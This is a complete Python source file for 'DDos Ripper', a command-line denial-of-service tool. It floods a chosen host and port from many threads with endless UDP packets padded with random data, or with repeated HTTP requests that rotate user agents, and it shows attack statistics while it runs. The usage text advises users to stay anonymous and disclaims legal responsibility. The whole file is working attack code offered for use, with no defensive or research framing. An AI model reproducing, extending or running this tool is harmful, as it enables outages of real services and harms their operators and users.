import random
import socket
import string
import signal
import sys
import threading
import time
import subprocess
import urllib.request
from optparse import OptionParser


# Constants
GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"


def user_agent():
    global uagent

    uagents = open("useragents.txt", "r")
    uagent = uagents.readlines()
    uagents.close()
    return uagent


def headers():
    # reading headers
    global data
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()


def set_headers_dict():
    # reading headers
    global headers_dict
    headers = open("headers.txt", "r")
    content = headers.readlines()
    headers_dict = {}
    for item in content:
        parts = item.split(':')
        headers_dict[parts[0]] = parts[1].strip()
    headers.close()


def get_random_string(len_from, len_to):
    # Random string with different length
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp():
    global packet_count
    i = 1
    while True:
        if random_packet_len:
            extra_data = get_random_string(0, 50000)
        else:
            extra_data = ''
        packet = str(
            "GET / HTTP/1.1\nHost: " + host
            + "\n\n User-Agent: "
            + random.choice(uagent)
            + "\n" + data
            + "\n\n" + extra_data).encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        p = int(port) if port else get_random_port()

        try:
            s.sendto(packet, (host, p))
        except socket.gaierror:
            if GETTING_SERVER_IP_ERROR_MSG not in errors:
                errors.append(GETTING_SERVER_IP_ERROR_MSG)
        else:
            if GETTING_SERVER_IP_ERROR_MSG in errors:
                errors.remove(GETTING_SERVER_IP_ERROR_MSG)
            packet_count += 1
            # print('\033[92m Packet was sent \033[0;0m')
        s.close()

        if port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host)
                thread.daemon = True
                thread.start()
        time.sleep(.01)


def down_it_http():
    global packet_count
    while True:
        protocol = 'http://'
        if port == 443:
            protocol = 'https://'

        url = f"{protocol}{host}:{port}"
        http_headers = headers_dict
        http_headers['User-Agent'] = random.choice(uagent).strip()

        try:
            urllib.request.urlopen(
                urllib.request.Request(url, headers=http_headers)
            )
        except:
            connections['fail'] += 1
        else:
            connections['success'] += 1
            # print('\033[92m HTTP-Request was done \033[0;0m')

        packet_count += 1
        time.sleep(.01)


def usage():
    print(''' \033[0;95mDDos Ripper

	It is the end user's responsibility to obey all applicable laws.
	It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! \n
	Usage : python3 dripper.py [-s] [-p] [-t] [-pr]
	-h : -help
	-s : -server ip
	-p : -port default 80
	-t : -threads default 100\033[0m ''')

    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    global random_packet_len
    global attack_method
    global headers_dict
    optp = OptionParser(add_help_option=False, epilog="Rippers")
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
                    help="Send random packets with random length")
    optp.add_option("-m", "--method", type="str", dest="attack_method",
                    help="Attack method: udp (default), http")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = None
    else:
        port = opts.port

    if opts.threads is None:
        thr = 100
    else:
        thr = opts.threads

    if opts.random_packet_len:
        random_packet_len = True
    else:
        random_packet_len = False

    if opts.attack_method and opts.attack_method in ['udp', 'http']:
        attack_method = opts.attack_method
    else:
        attack_method = 'udp'


def check_host():
    try:
        socket.gethostbyname(host)
    except:
        return False
    else:
        return True


def connect_host():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, int(port)))
    except:
        connections['fail'] += 1
    else:
        connections['success'] += 1


def show_statistics():
    # Prints statistics to console
    subprocess.call("clear")
    subprocess.call("clear")  # Hack for docker
    m = f"Host, port: \033[94m{host}:{port}\033[0m\n"
    m += f"Attack method: \033[94m{attack_method}\033[0m\n"
    m += f"Threads: \033[94m{thr}\033[0m\n\n"
    if attack_method == 'udp' and random_packet_len:
        m += f"Random packet length: yes\n"
    if attack_method == 'udp':
        m += f"UDP packets sent: \033[92m{packet_count}\033[0;0m\n"
    elif attack_method == 'http':
        m += f"HTTP requests sent: \033[92m{packet_count}\033[0;0m\n"
    m += f"Connections: successful - \033[92m{connections['success']}\033[0;0m, failed - \033[91m{connections['fail']}\033[0m\n"
    for error in errors:
        m += error + '\n'
    sys.stdout.write(m)
    sys.stdout.flush()


def main():
    """The main function to run the script from the command line."""
    global packet_count
    global connections
    global errors

    packet_count = 0
    errors = []
    connections = {
        'success': 0,
        'fail': 0,
    }

    if len(sys.argv) < 2:
        usage()
    get_parameters()

    if not check_host():
        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
        exit()

    p = str(port) if port else '(22, 53, 80, 443)'
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    headers()
    time.sleep(2)

    thrs = []
    for i in range(int(thr)):
        if attack_method == 'udp':
            thrs.append(threading.Thread(target=down_it_udp))
        elif attack_method == 'http':
            set_headers_dict()
            thrs.append(threading.Thread(target=down_it_http))
        thrs[i].daemon = True  # if thread is exist, it dies
        thrs[i].start()

    while True:
        show_statistics()
        time.sleep(3)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)
